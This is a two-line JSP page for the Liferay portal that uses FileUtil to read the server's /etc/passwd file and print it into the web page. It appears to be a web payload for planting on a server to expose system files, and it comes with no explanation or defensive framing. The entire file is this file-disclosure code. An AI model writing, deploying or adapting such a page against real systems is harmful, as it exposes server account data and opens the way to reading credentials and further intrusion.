<%@ page import="com.liferay.portal.kernel.util.FileUtil" %>

<pre><%= FileUtil.read("/etc/passwd") %></pre>